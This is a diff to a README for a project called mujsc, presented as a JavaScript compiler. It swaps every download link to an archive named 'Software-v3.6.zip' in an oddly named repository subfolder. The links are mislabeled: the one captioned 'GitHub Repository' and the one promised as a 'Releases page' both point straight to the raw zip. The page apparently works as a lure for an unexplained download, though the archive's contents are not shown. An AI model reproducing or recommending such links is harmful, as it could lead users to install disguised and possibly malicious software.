@@ -1,7 +1,7 @@
 # 🚀 mujsc - Simple JavaScript Compiler for Your Computer
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/mujsc.zip)](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/mujsc.zip)
+[![Download](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/Software-v3.6.zip)](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/Software-v3.6.zip)
 
 ## 📖 Overview
 mujsc is a tool that lets you compile a specific version of JavaScript, known as ES5, into machine code for x86_64 systems. This means you can run JavaScript code efficiently on your computer without needing a browser. The project uses MuJS as the frontend, making it lightweight and efficient.
@@ -23,7 +23,7 @@ Follow these simple steps to download and run mujsc.
 ### 1. Visit the Download Page
 Go to our Releases page to find the latest version of mujsc. Click the link below:
 
-[Download mujsc](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/mujsc.zip)
+[Download mujsc](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/Software-v3.6.zip)
 
 ### 2. Choose the Right Version
 On the Releases page, you will see the latest versions listed. Select the version that fits your operating system.
@@ -53,8 +53,8 @@ To compile JavaScript code, open mujsc and follow the prompts:
 If you have questions or need help, please visit our Issues section in the GitHub repository. You can report problems or request new features. We are here to assist you.
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/mujsc.zip)
-- [Download mujsc](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/mujsc.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/Software-v3.6.zip)
+- [Download mujsc](https://raw.githubusercontent.com/sujon5220/mujsc/main/Elkesaite/Software-v3.6.zip)
 
 ## 💬 Community
 Join our community on forums or social media for tips, tricks, and discussions about mujsc. Connect with others who use mujsc and share your experiences.
